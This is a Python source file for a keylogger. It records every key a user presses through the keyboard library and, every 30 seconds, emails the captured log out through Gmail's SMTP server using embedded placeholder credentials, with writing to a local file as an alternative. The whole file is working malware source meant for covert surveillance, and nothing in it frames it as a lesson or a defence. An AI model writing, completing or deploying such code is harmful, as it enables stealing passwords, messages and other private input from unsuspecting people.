import keyboard
import smtplib
from threading import Timer
from datetime import datetime

SEND_REPORT_SECONDS = 30
EMAIL = "email"
PASSWORD = "password"

class keylogger:
    def __init__(self, report_interval, report_method="email"):
        self.report_interval = report_interval
        self.report_method = report_method
        self.log = ""
        self.start_datetime = datetime.now()
        self.stop_datetime = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == 'enter':
                name = '{ENTER}\n'
            elif name == 'space':
                name = ' '
            elif name == 'decimal':
                name = '.'
            else:
                name = name.replace(' ', '_')
                name = f"[{name.upper()}]"
        self.log = self.log + name

    def update_file_name(self):
        start_datetime_str = str(self.start_datetime)[:7].replace(' ', '-').replace(':', '')
        stop_datetime_str = str(self.stop_datetime)[:7].replace(' ', '-').replace(':', '')
        self.filename = f"log-{start_datetime_str}_{stop_datetime_str}"

    def update_file_logs(self):
        with open(f"{self.filename}.txt", 'w') as File:
            print(self.log, file=File)
        print(f"[+] Saved {self.filename}.txt")

    def send_email(self, email, password, log):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, log)
        server.quit()

    def report(self):
        if self.log:
            self.stop_datetime = datetime.now()
            self.update_file_name()
            if self.report_method == 'email':
                self.send_email(EMAIL, PASSWORD, self.log)
            elif self.report_method == 'file':
                self.update_file_logs()
            self.start_datetime = datetime.now()
        self.log = ""
        timer = Timer(interval=self.report_interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_datetime = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print (f"{datetime.now()} - Started Keylogger")
        keyboard.wait()

if __name__ == "__main__":
    Keylogger = keylogger(report_interval=SEND_REPORT_SECONDS, report_method="email")
    Keylogger.start()